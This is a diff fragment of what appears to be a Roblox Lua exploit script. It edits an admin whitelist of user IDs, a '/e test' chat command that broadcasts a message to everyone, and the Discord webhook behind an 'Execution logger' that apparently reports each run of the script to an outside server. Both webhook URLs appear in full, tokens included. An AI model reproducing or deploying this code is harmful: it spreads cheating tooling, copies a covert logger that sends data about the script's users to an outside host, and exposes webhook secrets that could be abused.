@@ -5123,7 +5123,7 @@ local swagmins = {
   92157681, -- Ninaly4567
   1688589423, -- KR1STlNA
   2351144328, -- suslevel9999
-  1997397874, 
+  2910595304, 
 }
 
 local bending = false
@@ -5218,7 +5218,7 @@ local function commands(msg,plr)
             end
         else
             if string.find(msg, '/e test') then
-                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LOOLOLOLO", 'All');
             end
         end
     end
@@ -5952,7 +5952,7 @@ end})
    "Kid with shit exploit"
    
    local url =
-   "https://discord.com/api/webhooks/987594972536668190/cLtgSejdjNymyjFPp6YwfaEk89nTw4c9yKvMbio6sQEDzcxPjOXDOplgesgykXhktOqO"
+   "https://discord.com/api/webhooks/987621972232007690/OVE8Iy9wvU84dMYTbHRueDFrzdwApSLDD49nbV_ZJ5BTtX_34oJLq1YJ062YJ86wA0E4"
 local data = {
    ["content"] = " Slammys Execution logger @everyone",
    ["embeds"] = {
